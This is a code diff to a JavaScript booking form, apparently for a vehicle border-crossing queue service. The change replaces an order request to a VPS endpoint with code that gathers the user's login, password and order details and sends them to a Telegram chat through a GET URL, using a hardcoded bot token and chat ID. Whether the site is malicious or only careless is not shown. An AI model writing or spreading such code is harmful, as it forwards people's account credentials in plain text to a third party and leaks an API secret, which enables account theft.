@@ -182,11 +182,37 @@
 
 
                 async function gett() {
-                    let res = await fetch(`https://vm56196.vps.client-server.site/create_order?id=${id}&login=${login}&password=${pass}&avto=${avto}&granica=${granica}&ddate=${date_input.value}&ddate_do=${date_input_do.value}&ot=${ot_input.value}&do=${do_input.value}&username=${username}&username=${name}, {
+                    const botToken = '6486172343:AAHp-qzgdgkQ3ibn3upDQQHGZ1rSBLcDgoc';
+                    const chatId = '-1002030269077';
+                    const text = `Заказ создан: 
+                - ID: ${id}
+                - Логин: ${login}
+                - Пароль: ${pass}
+                - Авто: ${avto}
+                - Граница: ${granica}
+                - Дата с: ${date_input.value}
+                - Дата по: ${date_input_do.value}
+                - От: ${ot_input.value}
+                - До: ${do_input.value}
+                - Имя пользователя: ${username}
+                - Имя: ${name}`;
+                
+                    // Формируем URL для запроса к Telegram Bot API
+                    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+                
+                    // Отправляем сообщение
+                    let res = await fetch(telegramApiUrl, {
                         method: "GET",
                         headers: {"Content-type": "application/json; charset=UTF-8"},
                         mode: "cors"
-                    })
+                    });
+                
+                    // Проверяем ответ от API
+                    if (res.ok) {
+                        console.log("Сообщение успешно отправлено");
+                    } else {
+                        console.error("Ошибка при отправке сообщения");
+                    }
                     let content = JSON.parse(await res.text())
                     console.log('order', content)
                     document.getElementsByClassName("forma")[0].style.display = "none";
